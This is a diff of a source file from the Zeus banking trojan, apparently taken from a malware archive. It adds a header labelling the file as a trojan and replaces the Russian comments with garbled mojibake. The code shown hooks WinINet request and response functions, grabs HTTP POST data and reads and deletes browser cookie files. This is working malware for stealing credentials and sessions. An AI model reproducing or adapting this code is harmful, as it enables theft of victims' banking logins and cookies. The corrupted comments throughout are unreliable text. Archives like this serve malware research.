@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <wininet.h>
@@ -50,11 +61,11 @@ static DWORD connectionsCount;
 static CRITICAL_SECTION connectionsCs;
 
 /*
-  Поиск соединенения в таблице.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN handle - хэндл.
+  IN handle - пїЅпїЅпїЅпїЅпїЅ.
 
-  Return    - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return    - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD connectionFind(HINTERNET handle)
 {
@@ -63,11 +74,11 @@ static DWORD connectionFind(HINTERNET handle)
 }
 
 /*
-  Добавление соединения в таблицу.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN handle - хэндл.
+  IN handle - пїЅпїЅпїЅпїЅпїЅ.
 
-  Return    - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return    - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD connectionAdd(HINTERNET handle)
 {
@@ -108,11 +119,11 @@ static DWORD connectionAdd(HINTERNET handle)
 }
 
 /*
-  Поиск соединенения в таблице, и его добавление в случаи отсутвия.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN handle - хэндл.
+  IN handle - пїЅпїЅпїЅпїЅпїЅ.
 
-  Return    - индекс соединения в таблице, или (DWORD)-1 если не найдено.
+  Return    - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD connectionFindEx(HINTERNET handle)
 {
@@ -122,9 +133,9 @@ static DWORD connectionFindEx(HINTERNET handle)
 }
 
 /*
-  Удаление соединения из таблицы.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN index - индекс соединения.
+  IN index - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void connectionRemove(DWORD index)
 {
@@ -234,11 +245,11 @@ enum
 #define WININETCOOKIE_BUFFER_SIZE (sizeof(INTERNET_CACHE_ENTRY_INFOW) + INTERNET_MAX_URL_LENGTH * sizeof(WCHAR) + MAX_PATH * sizeof(WCHAR))
 
 /*
-  Чтение кука Wininet из файла.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Wininet пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN fileName - имя файла.
+  IN fileName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - данные кука(удалит через Mem), или NULL - в случаи ошибки.
+  Return      - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem), пїЅпїЅпїЅ NULL - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static LPSTR __inline parseWininetCookies(LPWSTR fileName)
 {
@@ -306,7 +317,7 @@ typedef struct
 }WININETCOOKIESPROCFINDDATA;
 
 /*
-  Кэлбэк Fs::_findFiles().
+  пїЅпїЅпїЅпїЅпїЅпїЅ Fs::_findFiles().
 */
 static bool wininetCookiesFindProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
 {
@@ -339,11 +350,11 @@ static bool wininetCookiesFindProc(const LPWSTR path, const WIN32_FIND_DATAW *fi
 }
 
 /*
-  Обработка куков Wininet.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Wininet.
 
-  IN flags     - флаги COOKIESFLAG_*.
-  OUT list     - полный список куков.
-  OUT listSize - размер списка куков.
+  IN flags     - пїЅпїЅпїЅпїЅпїЅ COOKIESFLAG_*.
+  OUT list     - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  OUT listSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 static void wininetCookiesProc(DWORD flags, LPSTR *list, LPDWORD listSize)
 {
@@ -404,10 +415,10 @@ void WininetHook::_removeCookies(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Установка хука на InternetStatusCallback для хэндла и его родителей.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ InternetStatusCallback пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN handle - HINTERNET.
-  IN hooker - функция-перехватчик с прототипом InternetStatusCallbacks.
+  IN hooker - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetStatusCallbacks.
 */
 static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 {
@@ -436,7 +447,7 @@ static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 #define READCONTEXT_BUFFER_SIZE 4096 //Read buffer for readAllContext ().
 
 /*
-  Кэллбэк для readAllContext().
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ readAllContext().
 */
 static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength)
 {
@@ -456,15 +467,15 @@ static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR contex
 }
 
 /*
-  Чтение всего контекста в буфер.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN request      - запрос.
-  IN readEvent    - событие ассоциированое с соединением.
-  OUT context     - буфер.
-  OUT contentSize - размер буфера.
+  IN request      - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN readEvent    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT context     - пїЅпїЅпїЅпїЅпїЅ.
+  OUT contentSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Retrun          - true - в случаи успеха,
-                    false - в случаи ошибки.
+  Retrun          - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                    false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context, LPDWORD contentSize)
 {
@@ -508,9 +519,9 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
         if(CWA(kernel32, GetLastError)() == ERROR_IO_PENDING)
         {
           /*
-            Вообщем это место является больным, т.к. в этот преуд программа этажом выше просто
-            сбивает нашу readAllContextCallback(). И мы не когда не получем сигнал от события.
-            Нужно найти способ избваиться от InternetSetStatusCallback().
+            пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+            пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ readAllContextCallback(). пїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+            пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ InternetSetStatusCallback().
           */
           Sync::_waitForMultipleObjectsAndDispatchMessages(1, &readEvent, false, INFINITE);
           continue;
@@ -547,15 +558,15 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 }
 
 /*
-  Операции производимые в момент чтения HTTP-ответа.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅ.
   
-  IN OUT request         - хэндл запроса.
-  OUT buffer             - буфер для считаных данных. NULL - для возврата достпуного размера.
-  IN numberOfBytesToRead - размер буфера.
-  OUT numberOfBytesRead  - кол. прочитаных байт.
+  IN OUT request         - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT buffer             - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. NULL - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN numberOfBytesToRead - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT numberOfBytesRead  - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  Return                 - (-1) - вызвать стандартную функцию чтения.
-                           В другом случаи, вернуть вместо вызова стандартной функции, это значение.
+  Return                 - (-1) - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+                           пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesRead)
 {
@@ -673,15 +684,15 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Заполнение HttpGrabber::REQUESTDATA.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpGrabber::REQUESTDATA.
 
-  OUT requestData - структура.
-  IN request      - хэндл текущего запроса.
-  IN postData     - POST-данные.
-  IN postDataSize - размер POST-данных.
+  OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN request      - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN postData     - POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN postDataSize - пїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return          - true - в случуи успеха,
-                    false - в случаи ошибки.
+  Return          - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                    false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET request, const void *postData, DWORD postDataSize)
 {
@@ -759,14 +770,14 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
 }
 
 /*
-  Операции производимые в момент отправки HTTP-запроса.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN request          - запрос.
-  IN OUT postData     - POST-данные.
-  IN OUT postDataSize - размер postData.
+  IN request          - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT postData     - POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT postDataSize - пїЅпїЅпїЅпїЅпїЅпїЅ postData.
 
-  Return              - (-1) - вызвать стандартную функцию отсылки запроса.
-                        В другом случаи, вернуть вместо вызова стандартной функции, это значение.
+  Return              - (-1) - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+                        пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDataSize)
 {
